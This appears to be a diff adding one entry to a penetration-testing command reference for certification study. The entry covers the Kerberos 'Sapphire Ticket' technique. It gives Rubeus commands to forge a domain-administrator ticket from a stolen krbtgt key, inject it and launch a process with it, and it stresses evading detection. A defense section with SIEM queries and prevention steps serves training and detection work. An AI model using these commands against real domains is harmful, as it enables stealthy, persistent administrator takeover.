@@ -1,0 +1,101 @@
+{
+  "id": "ad-sapphire-ticket",
+  "name": "Sapphire Ticket - Hybrid Diamond Ticket with S4U2Self",
+  "command": "Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:<dc_ip> /ticketuserid:500 /groups:512",
+  "description": "Sapphire Tickets combine Diamond Ticket technique with S4U2Self to create tickets that are indistinguishable from legitimate ones. Instead of modifying a TGT's PAC directly, it uses S4U2Self to get a legitimate PAC for the target user, then embeds it in a forged ticket. Harder to detect than Golden/Silver tickets because the PAC is a real PAC from the DC.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Charlie Clark (Semperis) research; Rubeus diamond ticket mode",
+  "tags": [
+    "sapphire-ticket",
+    "diamond-ticket",
+    "kerberos",
+    "persistence",
+    "krbtgt",
+    "s4u2self",
+    "forged-ticket"
+  ],
+  "mitre": [
+    "T1558.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nGolden Ticket: fully forged TGT with fabricated PAC\nDiamond Ticket: request real TGT, decrypt with krbtgt key, modify PAC\nSapphire Ticket: like Diamond, but uses S4U2Self for a real PAC\n\nThe Sapphire Ticket's PAC is legitimate (obtained via S4U2Self),\nmaking it pass PAC validation checks that catch Golden Tickets.\n\n=== PREREQUISITES ===\n- krbtgt AES256 key (from DCSync or NTDS.dit)\n- Domain SID\n\n=== CREATE SAPPHIRE TICKET ===\n  # Rubeus diamond with /tgtdeleg requests a real TGT first\n  Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:<dc_ip> /ticketuserid:500 /groups:512\n\n  # The /tgtdeleg flag makes Rubeus use S4U2Self to get a real PAC\n  # The result is a TGT that passes all PAC validation\n\n=== USING THE TICKET ===\n  Rubeus.exe ptt /ticket:<base64_ticket>\n  # Or save to file and use with other tools\n  Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:corp.local /username:administrator /password:fake /ticket:<base64>\n\n=== DETECTION DIFFICULTY ===\n- PAC is legitimate (S4U2Self from DC)\n- Encryption matches krbtgt key\n- TGT structure is valid\n- Only detectable via anomalous TGT requests or krbtgt key compromise indicators\n\n=== COMPARISON ===\n  Golden Ticket:   fabricated PAC, easier to detect via PAC validation\n  Silver Ticket:   service-specific, no DC contact, limited scope\n  Diamond Ticket:  modified PAC on real TGT, detectable via PAC mismatch\n  Sapphire Ticket: real PAC via S4U2Self, hardest to detect",
+  "examples": [
+    {
+      "label": "Create Sapphire Ticket",
+      "command": "Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:dc01.corp.local /ticketuserid:500 /groups:512"
+    },
+    {
+      "label": "Inject ticket into session",
+      "command": "Rubeus.exe ptt /ticket:<base64_ticket>"
+    },
+    {
+      "label": "Create process with ticket",
+      "command": "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /ticket:<base64>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Diamond and Sapphire Tickets - Semperis",
+      "url": "https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/"
+    },
+    {
+      "title": "Rubeus Wiki - Diamond Tickets",
+      "url": "https://github.com/GhostPack/Rubeus"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Golden Ticket is the original forged TGT; Sapphire is the evasive evolution.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-secretsdump-dcsync",
+      "note": "DCSync provides the krbtgt key needed for Sapphire Tickets.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "By using S4U2Self to obtain a real PAC from the DC, the Sapphire Ticket bypasses PAC validation checks that catch Golden and Diamond Tickets. The PAC is legitimate, just embedded in an attacker-controlled TGT.",
+    "prerequisites": "krbtgt AES256 key (requires prior domain compromise via DCSync or NTDS.dit extraction).",
+    "impact": "Persistent domain admin access via undetectable forged Kerberos tickets.",
+    "detection": "[MITRE T1558.001] Anomalous S4U2Self requests followed by TGT usage; TGT requests that bypass normal AS-REQ flow; krbtgt key rotation indicators.",
+    "artifacts": "S4U2Self requests for high-privilege accounts; TGTs with unusual lifetimes or request patterns.",
+    "splunk_spl": "index=wineventlog EventCode=4769 ServiceName=\"krbtgt\" TicketEncryptionType=0x12\n| where TicketOptions LIKE \"%forwardable%\"\n| stats count by ServiceName, TargetUserName, IpAddress\n| where count > 5",
+    "elastic_kql": "event.code:\"4769\" AND winlog.event_data.ServiceName:\"krbtgt\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| where ServiceName == \"krbtgt\"\n| project TimeGenerated, TargetUserName, IpAddress, TicketEncryptionType",
+    "sigma_rules": "win_kerberos_sapphire_diamond_ticket",
+    "prevention": "Rotate krbtgt password twice (invalidates all tickets); monitor for DCSync; use ATA/MDI for anomalous Kerberos detection; enable PAC validation.",
+    "sources": [
+      "https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/",
+      "https://attack.mitre.org/techniques/T1558/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Sapphire/Diamond Ticket - Anomalous S4U2Self",
+        "logic": "SecurityEvent\n| where EventID == 4769\n| where ServiceName == \"krbtgt\" and TicketEncryptionType == \"0x12\"\n| summarize RequestCount=count() by TargetUserName, IpAddress, bin(TimeGenerated, 1h)\n| where RequestCount > 3",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4769"
+        ],
+        "attack": [
+          "T1558.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate Kerberos renewals and delegation",
+        "tuning": "Correlate with DCSync detection (Event 4662 with replication rights)"
+      }
+    ]
+  }
+}
